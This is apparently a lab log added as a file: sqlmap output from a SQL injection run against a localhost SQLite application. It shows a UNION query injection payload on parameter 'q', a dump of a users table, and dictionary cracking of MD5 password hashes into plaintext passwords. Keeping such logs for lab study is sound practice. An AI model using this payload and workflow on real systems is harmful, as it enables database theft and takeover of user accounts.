@@ -1,0 +1,66 @@
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.10.9#stable}
+|_ -| . [,]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 21:01:10 /2026-09-28/
+
+[21:01:10] [WARNING] using '/private/tmp/sqlmap_lab_out' as the output directory
+[21:01:10] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: q (GET)
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: q=clean' UNION ALL SELECT NULL,NULL,NULL,CHAR(113,98,112,122,113)||CHAR(102,107,121,105,83,118,117,69,86,69,122,66,79,67,67,101,104,89,86,102,70,74,70,99,90,102,112,109,69,109,112,85,89,103,75,116,118,67,83,101)||CHAR(113,122,122,122,113)-- RigV
+---
+[21:01:10] [INFO] testing SQLite
+[21:01:10] [INFO] confirming SQLite
+[21:01:10] [INFO] actively fingerprinting SQLite
+[21:01:10] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[21:01:10] [INFO] fetching columns for table 'users' 
+[21:01:10] [WARNING] reflective value(s) found and filtering out
+[21:01:10] [INFO] fetching entries for table 'users'
+[21:01:10] [INFO] recognized possible password hashes in column 'password_md5'
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
+do you want to crack them via a dictionary-based attack? [Y/n/q] Y
+[21:01:10] [INFO] using hash method 'md5_generic_passwd'
+what dictionary do you want to use?
+[1] default dictionary file '/opt/homebrew/Cellar/sqlmap/1.10.9/libexec/data/txt/wordlist.tx_' (press Enter)
+[2] custom dictionary file
+[3] file with list of dictionary files
+> 1
+[21:01:10] [INFO] using default dictionary
+do you want to use common password suffixes? (slow!) [y/N] N
+[21:01:10] [INFO] starting dictionary-based cracking (md5_generic_passwd)
+[21:01:10] [INFO] starting 16 processes 
+
+[21:01:11] [INFO] cracked password '12345' for user 'svc_sync'
+
+[21:01:11] [INFO] cracked password '123456' for user 'jsmith'
+
+[21:01:17] [INFO] cracked password 'password' for user 'admin'
+
+[21:01:17] [INFO] cracked password 'qwerty' for user 'guest'
+
+Table: users
+[4 entries]
++----+----------+----------+---------------------------------------------+
+| id | role     | username | password_md5                                |
++----+----------+----------+---------------------------------------------+
+| 1  | admin    | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
+| 2  | editor   | jsmith   | e10adc3949ba59abbe56e057f20f883e (123456)   |
+| 3  | service  | svc_sync | 827ccb0eea8a706c4c34a16891f84e7b (12345)    |
+| 4  | readonly | guest    | d8578edf8458ce06fbc5bb76a58c5ca4 (qwerty)   |
++----+----------+----------+---------------------------------------------+
+
+[21:01:19] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/private/tmp/sqlmap_lab_out/localhost/dump/SQLite_masterdb/users.csv'
+[21:01:19] [INFO] fetched data logged to text files under '/private/tmp/sqlmap_lab_out/localhost'
+
+[*] ending @ 21:01:19 /2026-09-28/
+
